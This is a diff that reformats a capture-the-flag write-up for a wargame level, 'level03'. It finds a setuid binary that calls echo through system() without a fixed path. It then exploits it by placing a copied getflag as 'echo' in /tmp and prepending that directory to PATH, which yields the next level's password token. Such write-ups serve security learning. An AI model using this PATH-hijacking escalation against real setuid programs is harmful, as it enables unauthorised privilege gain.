@@ -1,29 +1,29 @@
-# ls -l
-# => -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+$ ls -l
+ -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
 
-# we see with the S in permission that program lvl 3 has shared uid bit set by flag03
+we see with the S in permission that program lvl 3 has shared uid bit set by flag03
 
-#the program just print to the output
+the program just print to the output
 
-#./level03
-# => Exploit me
+$./level03
+  Exploit me
 
-#strings ./level03 | grep echo
-# => /usr/bin/env echo Exploit me
+$ strings ./level03 | grep echo
+ /usr/bin/env echo Exploit me
 
-#strings ./level03 | grep system
-# => system
-# => system@@GLIBC_2.0
+$ strings ./level03 | grep system
+ system
+ system@@GLIBC_2.0
 
-#We know the program use :  system("echo Exploit me")
+We know the program use :  system("echo Exploit me")
 
-#So exploit is 
+So exploit is 
 
-#mkdir /tmp/lv3
-#cp /bin/getflag /tmp/lv3/echo
-#export PATH=/tmp/lv3:$PATH
-#./level03
-# => Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+$ mkdir /tmp/lv3
+$ cp /bin/getflag /tmp/lv3/echo
+$ export PATH=/tmp/lv3:$PATH
+$ ./level03
+  Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 
-#su level04
-# password : qi0maab88jeaj46qoumi7maus
+$ su level04
+ password : qi0maab88jeaj46qoumi7maus
